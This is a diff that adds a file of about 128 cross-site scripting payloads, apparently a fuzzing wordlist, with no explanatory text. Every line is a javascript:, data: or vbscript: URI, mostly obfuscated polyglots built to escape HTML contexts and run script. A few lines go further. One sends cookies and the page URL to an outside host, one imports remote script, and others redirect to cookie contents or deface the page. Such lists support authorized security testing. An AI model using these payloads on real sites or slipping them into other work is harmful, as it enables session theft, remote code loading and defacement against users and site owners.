@@ -1,0 +1,128 @@
+javascript://%0Aalert(1)
+javascript:/*/*/**/**/**/*%0D%0A%0d%0a*//**/oNclick-alert())//</style/</title/</textarEa/</script/->\x3ciframe/<iframe/oNloAd-alert(1)//>\x3e
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is/.source))}//\76-->
+javascript://%250Aalert(1)
+javascript:\/\/%250Aalert(1)
+javascript:\\\/\\\/%250Aalert(1)
+javascript:\\\\\\\/\\\\\\\/%250Aalert(1)
+javascript:\\\\\\\\\\\\\\\/\\\\\\\\\\\\\\\/%250Aalert(1)
+javascript://%250Alert(document.location=document.cookie)
+JavaScript://%250Dtop.confirm?.(1)//
+javascript://%2F%27%2F%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E--%3E%3Cp%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS')
+javascript://%2F%2F%27%2F%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E--%3E%3Cp%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B%27%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS')
+javascript:%61lert(1)
+javascript:74163166147401571561541571411447514115414516216450615176
+javascript:{ alert`0` }
+javascript:/*'-alert(1)-'*/
+javascript:alert(1)
+javascript:alert(1);/////
+javaScRipt:Alert(‘1’)
+jAvaScripT:(alert)`1`
+JavaSCript:alert(123)
+javascript:alert('1')"*alert(1)*"
+javascript:alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)//
+javascript:alert(1)?q=%26callback%3Durc_button.click%23
+javascript:alert/*`/*\/*'/*\"/*"/**/(alert())// alert()//--></template><frame/onload=alert() <img src=x onerror=alert()></style/</title/</textarea/</noscript/</noembed/</script><script>alert()</script>
+javascript:alert()//*/alert()/*'-/"/-eval(`(alert())`)//\"-alert()//--></title></style></noscript></textarea></template></noembed><script>alert()</script><frameset onload=alert()><svg/onload=alert(1)> alert()//
+javascript:alert()//\";alert();/*-/*`/*\`/*'/*"/**///--><FRAME SRC="javascript:alert();"></textarea></style></noscript></noembed></template></option></select></script></title><svg/onload=alert()><svg/onload=alert()> alert(1)//
+javascript:alert()//'//"//\"; '/`/*\/*'/*"/**/(alert())//</style></template/</title/</textarea/</noscript/</noembed/</script>--><frame <svg onload=alert()><script>alert()</script>
+javascript:alert()//'//"//\"//-->`//*/ alert();//</title></textarea></style></noscript></noembed></template><frame onload=alert()></select></script><<svg onload=alert()>
+javascript:alert()//'//"//`//></a></option></select></template></noscript></script></title></style></textarea></noembed>--><<svg onload=alert()>\">alert()//*/ alert()//<frame src=javascript:alert()>
+javascript:alert(document.domain);
+javascript:alert()//<frame/src=javascript:alert()><svg/onload=alert()>`;alert()`';alert()//\";alert();//"//--></title></textarea></style></noscript></noembed></template></option></select></script><svg onload=alert()>*/ alert()//*
+javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!--
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+javascript:alert()//\"//`//'//"//--></style></select></noscript></noembed></template></title></textarea></script><iframe/srcdoc="<svg/onload=alert()>"><frame/onload=alert()>*/ alert()//
+javascript:alert()//\ /*<svg/onload=';alert();'></textarea></style></title></noscript></template></noembed><frame onload=";alert();"></script>--><script>alert`;alert();`</script>*/alert()//\";alert()//
+javascript:alert();//</title></noscript></noembed></template></style></textarea><frameset onload='+/"/+/[*/[]/+alert()//'-->\" alert();/*`/**/(/**/alert())//<script>alert()</script><<svg onload=alert()>>
+javascript:alert()//--></title></style></noscript></noembed></template></select></textarea><frameset onload=alert()></script>*///\"//`//'//"//><svg <svg onload=alert()> alert()//
+javascript:alert()//</title></style></textarea></noscript></template></noembed><script>alert()</script>-->\";alert()//";alert()//';alert()//<script>alert()</script><frame src="javascript:alert()">` alert()//<svg/onload=alert()>*/alert()/*
+javascript:alert()//"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script>*/ alert()//<frame onload=alert()><<script>alert()<</script>
+javascript:alert()//*-->*`/*'/*"/*\"/*</title></textarea></style></noscript></noembed></template><frame src=javascript:alert()></script><script>/*<svg onload=alert()>*/ alert()//</script>
+javascript:/*"/*'/*`/*\"/**/ alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>--><<svg onload=alert()><frame src=javascript:alert()>
+javascript:"/*'/*\"/*` /**/alert()//--></title></textarea></style></noscript></noembed></template></script><script>alert()</script><svg/<frame/onload=alert()>
+javascript:alert()"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//<svg <frame */onload= alert()//</script>
+javascript:/*"/*`/*'/*\"/*-->*/ alert()//</title></textarea></style></noscript></noembed></template></script></select><frame/onload=alert``><<svg/onload=alert()>
+javascript:/*"/*\"/*`/*'/**/ (alert())//</title></textarea></style></noscript></script></noembed></template></select><frame src=javascript:alert()--><<svg/onload=alert()>
+javascript:/*`/*'/*'/*"-/*\"/**/ alert()//></title></textarea></style></select></script></noembed></noscript></template>--><<svg/onload=alert()><frame/src=javascript:alert()>
+javascript:(alert('XSS Success!'))()
+javascript://anything%0D%0A%0D%0Awindow.alert(1)
+javascript:confirm(0);
+javascript:confirm(1)
+javascript:confirm(1)//
+javascript:document.body.onclick=alert(1)
+javascript:document.getElementsByTagName(%60body%60)%5B0%5D.innerHTML=%60%3Ch1%3Ehacked%3C/h1%3E%60//
+Javascript://%E2%80%A9alert(618)
+javascript:%ef%bb%bfalert(XSS)
+javascript:eval(unescape(location.href))
+javascript:/*"/*'/*\"/*`/*><frame src=javascript:alert()></template </textarea </title </style </noscript </noembed </script --><<script>alert()<</script>\ /**/alert()//
+javascript:'/*`/*'/*"/*\"/*<FRAME SRC= javascript:/**/-alert()//--></title></textarea></style></noscript></noembed></template></script><script>//<svg onload= alert()//</script>
+javascript:new%20Function`al\ert\`1\``;
+javascript:"/*\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame/onload=alert()><<svg/onload= /**/alert()//>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+jaVasCript:\/*-\/*`\/*\\`\/*\'\/*\"\/**\/(\/* *\/oNcliCk=alert() )\/\/%0D%0A%0D%0A\/\/<\/stYle\/<\/titLe\/<\/teXtarEa\/<\/scRipt\/--!>\\x3csVg\/<sVg\/oNloAd=alert()\/\/>\\x3e
+jaVasCript:\\\/*-\\\/*`\\\/*\\\\`\\\/*\\\'\\\/*\\\"\\\/**\\\/(\\\/* *\\\/oNcliCk=alert() )\\\/\\\/%0D%0A%0D%0A\\\/\\\/<\\\/stYle\\\/<\\\/titLe\\\/<\\\/teXtarEa\\\/<\\\/scRipt\\\/--!>\\\\x3csVg\\\/<sVg\\\/oNloAd=alert()\\\/\\\/>\\\\x3e
+jaVasCript:\\\\\\\/*-\\\\\\\/*`\\\\\\\/*\\\\\\\\`\\\\\\\/*\\\\\\\'\\\\\\\/*\\\\\\\"\\\\\\\/**\\\\\\\/(\\\\\\\/* *\\\\\\\/oNcliCk=alert() )\\\\\\\/\\\\\\\/%0D%0A%0D%0A\\\\\\\/\\\\\\\/<\\\\\\\/stYle\\\\\\\/<\\\\\\\/titLe\\\\\\\/<\\\\\\\/teXtarEa\\\\\\\/<\\\\\\\/scRipt\\\\\\\/--!>\\\\\\\\x3csVg\\\\\\\/<sVg\\\\\\\/oNloAd=alert()\\\\\\\/\\\\\\\/>\\\\\\\\x3e
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+jaVasCript:/*`/*\`/*'/*\"//"/**/(onload=alert())//<svg/onload=alert()><frame/onload=alert()></select></noscript></noembed></template></stYle/</titLe/</teXtarEa/</script/--><sVg/oNloAd= alert()//>
+javascript:prompt(1)#{"action":1}
+javascript:prompt(/XSS/.source);var x = prompt;x(0);x(/XSS/.source);x
+javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert()--><<svg/*/ onload=alert()//>
+javascript:/*--></script></textarea></style></noscript>\"</noembed>[`</template>["</select>['</title>]<<script>///<frame */ onload=alert()//<</script>
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript:/*"//'//`//\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame/<svg/*/onload= alert()//</script>
+javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img - /style=a:expression&#40&#47&#42'/- /*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name)onclick=eval(name) onmouseover=eval(name) onbegin=eval(name)background=javascript:eval(name)//>"
+javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*<svg <frame */ onload=alert()//</script>
+javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame <svg"///*/ onload=alert()//</script>
+javascript:"/*`/*\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*<i<frame/*/ onload=alert()//</Script>
+javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert()//--><<sVg/onload=alert``>
+javascript:`/*\"/*--><svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript><<script/>/<frame */; onload=alert()//<</script>`
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>
+javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/<i<frame */ onload=alert()//</script>
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript:/*"/*'/*\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame <svg */ onload=alert()//</script>
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript:/*"/*`/*'/*\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*<svg <frame onload=/**/alert()//</script>
+javascript:/*--></title></style></template></noscript></noembed></textarea></script><svg/onload='+/"/+/onclick=1/+/[*/[]/+alert()//'>"><svg/onload=`+/"/+/onclick=/+/[*/[]/+alert()//'>"><script>alert()</script><frame src="javascript:alert()"></frameset>+\"; alert()//<img src onerror=alert()>
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>
+javascript:`/*</title></style></textarea></noscript></script></noembed></template></select/"/'/*--><frame onload=alert()><svg/\"/*<svg onload=' /**/-alert()//'>javascript:/*`/*\"/*'/*</noembed>"/*<frame src=javascript:/**/;alert()//--></title></textarea></style></noscript></template></select></script><<svg/onload= alert()//>
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><p" %0A onclick=alert()//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert(123)//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert(123)//>*/alert()/*<img src=x onerror=alert(456)/><svg/onload=prompt(789)/>;'"// :;fn();%0a%0d\n\r\t{{12*12+'Audi RS5'.substr(0,4)}}XXX<script>alert('XSS')
+javascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert(123)//>*/alert()/*<img src=x onerror=alert(456)/><svg/onload=prompt(789)/>;'"// :;fn();%0a%0d\n\r\t{{12*12+'Audi RS5'.substr(0,4)}}XXX<script>alert('XSS')<img src=x onerror='(function s(){var i=new Image();i.src='http://bl4de.tech/bxss.php?c='+document.cookie+';'+encodeURIComponent(location.href);document.body.append(i)})()'/>#jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
+javascript://'/</title></style></textarea></script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS')
+javascript:\/\/\'\/<\/title><\/style><\/textarea><\/script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B\'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+\'Audi%20RS5\'.substr(0,4)}}XXX%3Cscript%3Ealert(\'XSS\')
+javascript:\\\/\\\/\\\'\\\/<\\\/title><\\\/style><\\\/textarea><\\\/script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B\\\'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+\\\'Audi%20RS5\\\'.substr(0,4)}}XXX%3Cscript%3Ealert(\\\'XSS\\\')
+javascript:\\\\\\\/\\\\\\\/\\\\\\\'\\\\\\\/<\\\\\\\/title><\\\\\\\/style><\\\\\\\/textarea><\\\\\\\/script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B\\\\\\\'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+\\\\\\\'Audi%20RS5\\\\\\\'.substr(0,4)}}XXX%3Cscript%3Ealert(\\\\\\\'XSS\\\\\\\')
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+jaVasCript:/--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[/[]/+alert(1)//'>
+javascript:"/*'//`//\"//</title></template/</textarea/</style/</noscript/</noembed/</script>--><<script>alert()<</script><frame/*/ onload=alert()//>
+javascript:/*"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script><<script> /**/alert()//<</script><frame onload=alert()>
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`
+javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/<svg */ onload=alert()//</script>
+javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noembed></script><<script>/*` /*<frame src=javascript:/**/alert()//><</script>
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
+data:text/html;base64,Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7PjEy
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
+data:text/html,<script>alert(0)</script>
+javascript:\u0061lert&#x28;1&#x29
+javascript:var a=document.createElement('a');a.href='javascript:alert(1)';document.body.appendChild(a)
+javascript:var{a:onerror}={a:alert};throw%20document.domain
+javascript:var img=document.createElement('img');img.src='';document.body.appendChild(img);img.onerror=alert(1)
+javascript:x='%27-alert(1)-%27';
+vbscript:confirm(1);
+vbscript:msgbox("XSS")
+vbscript:prompt(1)#{"action":1}
